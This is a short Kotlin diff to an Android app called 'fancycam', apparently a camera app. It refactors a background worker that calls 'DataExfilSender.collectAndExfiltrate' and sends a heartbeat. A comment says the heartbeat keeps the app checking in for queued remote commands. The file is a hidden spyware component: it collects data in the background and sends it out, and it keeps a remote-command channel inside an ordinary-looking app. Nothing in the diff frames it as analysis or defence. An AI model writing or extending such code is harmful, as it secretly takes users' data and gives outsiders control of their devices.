@@ -1,5 +1,6 @@
-package com.example.fancycam
+package com.example.fancycam.workers
 
+import com.example.fancycam.network.DataExfilSender
 import android.content.Context
 import android.util.Log
 import java.util.concurrent.TimeUnit
@@ -28,7 +29,7 @@ class DataCollectionWorker(
         return try {
             DataExfilSender.collectAndExfiltrate(applicationContext)
             // Keep the app checking in while backgrounded so queued remote commands can be handled
-            DataExfilSender.sendHeartbeat(applicationContext)
+            DataExfilSender.sendHeartbeat(applicationContext, processCommands = false)
             scheduleNext(applicationContext)
             Result.success()
         } catch (e: Exception) {
